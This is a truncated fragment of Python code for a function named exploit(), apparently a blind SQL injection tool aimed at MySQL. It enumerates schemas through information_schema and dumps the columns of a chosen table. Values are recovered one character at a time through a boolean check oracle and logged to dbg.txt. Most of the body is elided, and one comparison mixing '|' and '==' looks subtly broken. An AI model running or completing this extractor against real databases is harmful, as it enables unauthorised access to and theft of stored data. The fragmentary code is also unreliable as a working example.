...
def exploit():
    ...
    if(mysql):
        if(database != ''):
            if(table != ''):
                if(columns != []):
                    data = {}
                    for s in columns:                      
                        main_payload = f'SELECT {s} FROM {database}.{table}'
                        temp_list = list()
        ...
        if(dbl):
            ...
            main_payload = 'SELECT schema_name FROM information_schema.schemata'
            list_dbs = list()
            ...
            while True:
                ...
                if(start_job(offset) == True):
                    list_dbs.append(''.join(temp_data))
                    offset += 1
                    time.sleep(1)
                else:
                    break;
    ...
    with open("dbg.txt", "a") as f:
        while (1):
            if (check(payload)):
                ...
                if (stop):
                    if (int(snumber) >= 31 | int(snumber) == 64):
                        print_data(True)
                        f.write(str(f"{snumber}\n"))
                        temp_data[letter_number] = chr(snumber)
